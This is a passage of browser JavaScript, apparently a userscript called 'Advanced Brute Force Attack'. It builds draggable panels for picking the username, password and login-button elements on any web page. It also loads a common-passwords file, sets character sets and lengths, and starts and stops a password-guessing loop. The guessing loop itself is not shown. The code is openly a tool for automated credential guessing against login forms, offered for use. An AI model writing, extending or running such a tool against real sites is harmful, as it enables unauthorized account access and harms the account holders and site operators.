    const logHeader = document.createElement('div');
    logHeader.className = 'brute-force-window-header';
    logHeader.textContent = 'Activity Log';
    const logCloseBtn = document.createElement('button');
    logCloseBtn.className = 'brute-force-window-close-button';
    logCloseBtn.textContent = '✖';
    logHeader.appendChild(logCloseBtn);
    logWindow.appendChild(logHeader);

    const logContent = document.createElement('div');
    logContent.className = 'brute-force-log-window-content';
    logWindow.appendChild(logContent);
    inspectorLog = logContent;

    const clearLogButton = document.createElement('button');
    clearLogButton.id = 'brute-force-clear-log-btn';
    clearLogButton.className = 'brute-force-button';
    clearLogButton.textContent = 'Clear Log';
    logWindow.appendChild(clearLogButton);

    // Toggle dot
    const toggleDot = document.createElement('div');
    toggleDot.id = 'brute-force-inspector-toggle-dot';
    toggleDot.className = 'brute-force-toggle-dot';
    toggleDot.textContent = '▶';

    // --- Element selection logic ---
    function handleElementSelection(event) {
        if (!isSelectingElement) return;

        event.preventDefault();
        event.stopPropagation();
        const element = event.target;

        switch (currentFieldToPopulate) {
            case 'username':
                selectedUsernameElement = element;
                usernameElementInfo.textContent = `<${element.tagName.toLowerCase()}> (ID: "${element.id || 'No ID'}", Class: "${element.className || 'No Class'}")`;
                usernameElementDisplay.style.display = 'flex';
                logAction('Username field selected.');
                break;
            case 'password':
                selectedPasswordElement = element;
                passwordElementInfo.textContent = `<${element.tagName.toLowerCase()}> (ID: "${element.id || 'No ID'}", Class: "${element.className || 'No Class'}")`;
                passwordElementDisplay.style.display = 'flex';
                // Automatically change password field to type="password" to hide attempts
                if (selectedPasswordElement.type === 'text') {
                    selectedPasswordElement.type = 'password';
                }
                logAction('Password field selected.');
                break;
            case 'loginButton':
                selectedLoginButtonElement = element;
                loginButtonElementInfo.textContent = `<${element.tagName.toLowerCase()}> (ID: "${element.id || 'No ID'}", Class: "${element.className || 'No Class'}")`;
                loginButtonElementDisplay.style.display = 'flex';
                logAction('Login button selected.');
                break;
        }

        isSelectingElement = false;
        document.body.style.cursor = 'default';
        currentFieldToPopulate = null;
        document.removeEventListener('click', handleElementSelection, true);
        document.removeEventListener('mousemove', handleHoverEffect);
        mainInspectorCloseButton.style.backgroundColor = '#bf616a';
        saveSettings();
    }

    function startSelection(field) {
        if (isSelectingElement) {
            logAction('Selection already in progress. Please click on an element or close the window to cancel.');
            return;
        }
        isSelectingElement = true;
        currentFieldToPopulate = field;
        document.body.style.cursor = 'crosshair';
        mainInspectorCloseButton.style.backgroundColor = '#ebcb8b';
        logAction(`Click on the ${field} element to select it.`);
        // Use a capturing listener (true) to ensure it fires before other listeners
        document.addEventListener('click', handleElementSelection, true);
        document.addEventListener('mousemove', handleHoverEffect);
    }

    let lastHoveredElement = null;
    function handleHoverEffect(event) {
        if (!isSelectingElement) return;
        const element = event.target;
        if (lastHoveredElement && lastHoveredElement !== element) {
            lastHoveredElement.style.outline = '';
        }
        if (element && element.tagName !== 'BODY') {
            element.style.outline = '2px solid #a3be8c';
            lastHoveredElement = element;
        }
    }
    // ... end of element selection logic

    // --- Event Listeners and Logic ---

    // Toggle dot listener
    toggleDot.addEventListener('click', () => {
        if (inspectorWindow.style.display === 'block') {
            inspectorWindow.style.display = 'none';
            settingsWindow.style.display = 'none';
            logWindow.style.display = 'none';
            toggleDot.textContent = '▶';
            logAction('All windows closed.');
        } else {
            inspectorWindow.style.display = 'block';
            toggleDot.textContent = '◀';
            logAction('Inspector opened.');
        }
    });

    // Main inspector window close button listener
    mainInspectorCloseButton.addEventListener('click', () => {
        inspectorWindow.style.display = 'none';
        settingsWindow.style.display = 'none';
        logWindow.style.display = 'none';
        toggleDot.textContent = '▶';
        logAction('All Advanced Brute Force Attack windows closed.');
        isSelectingElement = false;
        isGuessingPasswords = false;
        currentFieldToPopulate = null;
        document.body.style.cursor = 'default';
        if (selectedPasswordElement && selectedPasswordElement.type === 'text') {
            selectedPasswordElement.type = 'password';
            logAction('Password field type reverted to "password" on close.');
        }
        updateStatus('Status: Stopped');
    });

    // Selection button listeners
    consoleUsernameButton.addEventListener('click', () => startSelection('username'));
    consolePasswordButton.addEventListener('click', () => startSelection('password'));
    consoleLoginButton.addEventListener('click', () => startSelection('loginButton'));

    // Clear element listeners
    clearUsernameBtn.addEventListener('click', () => {
        selectedUsernameElement = null;
        usernameElementInfo.textContent = 'Username: Not selected';
        usernameElementDisplay.style.display = 'flex';
        logAction('Username field selection cleared.');
        saveSettings();
    });
    clearPasswordBtn.addEventListener('click', () => {
        selectedPasswordElement = null;
        passwordElementInfo.textContent = 'Password: Not selected';
        passwordElementDisplay.style.display = 'flex';
        logAction('Password field selection cleared.');
        saveSettings();
    });
    clearLoginBtn.addEventListener('click', () => {
        selectedLoginButtonElement = null;
        loginButtonElementInfo.textContent = 'Login Button: Not selected';
        loginButtonElementDisplay.style.display = 'flex';
        logAction('Login button selection cleared.');
        saveSettings();
    });

    // Start/Stop button listeners
    startButton.addEventListener('click', () => {
        if (!isGuessingPasswords) {
            isGuessingPasswords = true;
            isPaused = false;
            updateStatus('Status: Running...');
            logAction('Attack started.');
            startAttackLoop();
        }
    });
    stopButton.addEventListener('click', () => {
        if (isGuessingPasswords) {
            stopAttack();
        }
    });

    // Settings window listeners
    openSettingsButton.addEventListener('click', () => {
        if (settingsWindow.style.display === 'block') {
            settingsWindow.style.display = 'none';
        } else {
            settingsWindow.style.display = 'block';
            logWindow.style.display = 'none';
        }
    });
    settingsCloseBtn.addEventListener('click', () => {
        settingsWindow.style.display = 'none';
    });

    // Log window listeners
    openLogButton.addEventListener('click', () => {
        if (logWindow.style.display === 'block') {
            logWindow.style.display = 'none';
        } else {
            logWindow.style.display = 'block';
            settingsWindow.style.display = 'none';
        }
    });
    logCloseBtn.addEventListener('click', () => {
        logWindow.style.display = 'none';
    });
    clearLogButton.addEventListener('click', () => {
        inspectorLog.innerHTML = '';
        logAction('Log cleared.');
    });

    // Settings change listeners
    yourUsernameInput.addEventListener('input', () => {
        // Just let it update the variable, will be saved on button click
    });
    requireUsernameCheckbox.addEventListener('change', (e) => {
        requireUsername = e.target.checked;
    });
    autofillUsernameCheckbox.addEventListener('change', (e) => {
        autofillUsernameOnEachAttempt = e.target.checked;
    });
    useCommonPasswordsCheckbox.addEventListener('change', (e) => {
        useCommonPasswordsFirst = e.target.checked;
    });
    customCharsInput.addEventListener('input', (e) => {
        customCharacters = e.target.value;
        updateCharacterSet();
    });
    capitalizedCheckbox.addEventListener('change', (e) => {
        includeCapitalized = e.target.checked;
        updateCharacterSet();
    });
    numbersCheckbox.addEventListener('change', (e) => {
        includeNumbers = e.target.checked;
        updateCharacterSet();
    });
    symbolsCheckbox.addEventListener('change', (e) => {
        includeSymbols = e.target.checked;
        updateCharacterSet();
    });
    minLengthInput.addEventListener('change', (e) => {
        minPasswordLength = parseInt(e.target.value, 10) || 1;
    });
    maxLengthInput.addEventListener('change', (e) => {
        maxPasswordLength = parseInt(e.target.value, 10) || 8;
    });
    safeModeCheckbox.addEventListener('change', (e) => {
        safeModeEnabled = e.target.checked;
    });
    speedMultiplierSlider.addEventListener('input', (e) => {
        speedMultiplier = parseInt(e.target.value, 10) || 1;
        speedMultiplierValue.textContent = speedMultiplier + 'x';
    });
    saveSettingsButton.addEventListener('click', () => {
        saveSettings();
    });
    
    // Common Passwords File Reader - FIXED LOGIC
    commonPasswordsFileInput.addEventListener('change', (event) => {
        const file = event.target.files[0];
        if (!file) {
            return;
        }

        const reader = new FileReader();
        reader.onload = (e) => {
            const text = e.target.result;
            // Split the text by newline and filter out any empty lines
            uploadedCommonPasswords = text.split(/\r?\n/).filter(line => line.trim() !== '');
            currentCommonPasswordIndex = 0;
            commonPasswordsExhausted = false;
            if (uploadedCommonPasswords.length > 0) {
                logAction(`Successfully loaded ${uploadedCommonPasswords.length} common passwords from file.`);
                saveSettings();
            } else {
                logAction('Warning: The selected file is empty or could not be read.');
            }
        };
        reader.readAsText(file);
    });

    // Drag functionality for all windows
    [inspectorWindow, settingsWindow, logWindow].forEach(window => {
        const header = window.querySelector('.brute-force-window-header');
        if (header) {
            let isDragging = false;
            let currentX;
            let currentY;
            let initialX;
            let initialY;
            let xOffset = 0;
            let yOffset = 0;

            header.addEventListener('mousedown', (e) => {
                isDragging = true;
                initialX = e.clientX - xOffset;
                initialY = e.clientY - yOffset;
                header.style.cursor = 'grabbing';
            });

            document.addEventListener('mouseup', () => {
                isDragging = false;
                initialX = currentX;
                initialY = currentY;
                header.style.cursor = 'grab';
            });

            document.addEventListener('mousemove', (e) => {
                if (isDragging) {
                    e.preventDefault();
                    currentX = e.clientX;
                    currentY = e.clientY;
                    xOffset = currentX - initialX;
                    yOffset = currentY - initialY;
                    window.style.transform = `translate3d(${xOffset}px, ${yOffset}px, 0)`;
                }
            });
        }
    });

    // Style the new elements
    const style = document.createElement('style');
    style.textContent = `
        .brute-force-inspector-window {
            position: fixed;
            top: 20px;
            left: 20px;
            width: 350px;
            background-color: #2e3440;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: #d8dee9;
            z-index: 9999;
            resize: both;
            overflow: auto;
            border: 2px solid #5e81ac;
            display: none; /* Initially hidden */
        }
        .brute-force-window-header {
            cursor: grab;
            padding: 10px;
            background-color: #3b4252;
            border-top-left-radius: 6px;
            border-top-right-radius: 6px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-weight: bold;
        }
        .brute-force-window-close-button {
            background-color: #bf616a;
            color: white;
            border: none;
            border-radius: 50%;
            width: 25px;
            height: 25px;
            cursor: pointer;
            font-weight: bold;
            display: flex;
            align-items: center;
            justify-content: center;
            line-height: 1;
            transition: background-color 0.2s;
        }
        .brute-force-window-close-button:hover {
            background-color: #a45058;
        }
        .brute-force-content {
            padding: 15px;
        }
        .brute-force-status-display {
            background-color: #4c566a;
            color: #eceff4;
            padding: 8px;
            border-radius: 4px;
            text-align: center;
            margin-bottom: 15px;
            font-size: 14px;
            border-left: 4px solid #88c0d0;
        }
        .brute-force-section {
            background-color: #434c5e;
            padding: 15px;
            border-radius: 6px;
            margin-bottom: 15px;
        }
        .brute-force-section-title {
            color: #88c0d0;
            margin-top: 0;
            margin-bottom: 10px;
            font-size: 16px;
            border-bottom: 1px solid #4c566a;
            padding-bottom: 5px;
        }
        .brute-force-button {
            background-color: #5e81ac;
            color: white;
            border: none;
            padding: 8px 12px;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.2s, transform 0.1s;
            width: 100%;
            margin-top: 5px;
        }
        .brute-force-button:hover {
            background-color: #6a8db8;
        }
        .brute-force-button:active {
            transform: scale(0.98);
        }
        .brute-force-element-display {
            display: flex;
            align-items: center;
            background-color: #4c566a;
            padding: 8px;
            border-radius: 4px;
            margin-bottom: 5px;
        }
        .brute-force-element-display span {
            flex-grow: 1;
            font-family: monospace;
            font-size: 13px;
        }
        .brute-force-clear-btn {
            background-color: #d08770;
            color: white;
            border: none;
            padding: 5px 8px;
            border-radius: 4px;
            cursor: pointer;
            margin-left: 10px;
            transition: background-color 0.2s;
        }
        .brute-force-clear-btn:hover {
            background-color: #bf616a;
        }
        .brute-force-control-group {
            display: flex;
            justify-content: space-between;
            gap: 10px;
        }
        .brute-force-control-group .brute-force-button {
            flex-grow: 1;
        }
        .brute-force-input-group {
            display: flex;
            flex-direction: column;
            margin-bottom: 10px;
        }
        .brute-force-input-group label {
            font-size: 12px;
            color: #d8dee9;
            margin-bottom: 5px;
        }
        .brute-force-input {
            background-color: #4c566a;
            border: 1px solid #434c5e;
            color: #eceff4;
            padding: 6px;
            border-radius: 4px;
            font-size: 14px;
        }
        .brute-force-input:focus {
            outline: none;
            border-color: #88c0d0;
        }
        .brute-force-checkbox-group {
            display: flex;
            align-items: center;
            margin-bottom: 5px;
        }
        .brute-force-checkbox-group input {
            margin-right: 8px;
        }
        .brute-force-checkbox-group label {
            font-size: 14px;
            user-select: none;
        }
        .brute-force-range-container {
            display: flex;
            align-items: center;
            margin-top: 5px;
        }
        .brute-force-range-container span {
            white-space: nowrap;
            margin-left: 10px;
            font-size: 13px;
        }
        .brute-force-slider {
            width: 100%;
        }
        .brute-force-file-input {
            width: 100%;
            font-size: 12px;
        }
        .brute-force-toggle-dot {
            position: fixed;
            top: 10px;
            left: 10px;
            width: 30px;
            height: 30px;
            background-color: #5e81ac;
            border-radius: 50%;
            cursor: pointer;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.5);
            z-index: 9998;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            user-select: none;
        }
        .brute-force-log-window,
        .brute-force-settings-window {
            position: fixed;
            top: 70px;
            left: 20px;
            width: 400px;
            height: 300px;
            background-color: #2e3440;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
            color: #d8dee9;
            z-index: 9999;
            display: none;
            resize: both;
            overflow: auto;
            border: 2px solid #5e81ac;
            padding: 15px;
        }
        .brute-force-log-window-content {
            height: calc(100% - 40px); /* Adjust height for header */
            overflow-y: auto;
            background-color: #434c5e;
            padding: 10px;
            border-radius: 4px;
            font-family: monospace;
            font-size: 12px;
        }
        .brute-force-log-entry {
            margin-bottom: 5px;
        }
        .brute-force-settings-content {
            height: 100%;
            overflow-y: auto;
        }
        .brute-force-performance-graph {
            width: 100%;
            height: 150px;
            background-color: #4c566a;
            border-radius: 4px;
            margin-top: 10px;
            display: block;
        }
        .brute-force-close-group {
            display: flex;
            align-items: center;
            gap: 5px;
        }
    `;
    document.head.appendChild(style);

    // Initial load and setup
    loadSettings();
    updateCharacterSet();
    document.body.appendChild(toggleDot);
    document.body.appendChild(inspectorWindow);
    document.body.appendChild(logWindow);
    document.body.appendChild(settingsWindow);

    // Flush any pending logs that were created before the log window was appended
    flushTempLog();

    logAction('Advanced Brute Force Attack script loaded and windows created.');
})();
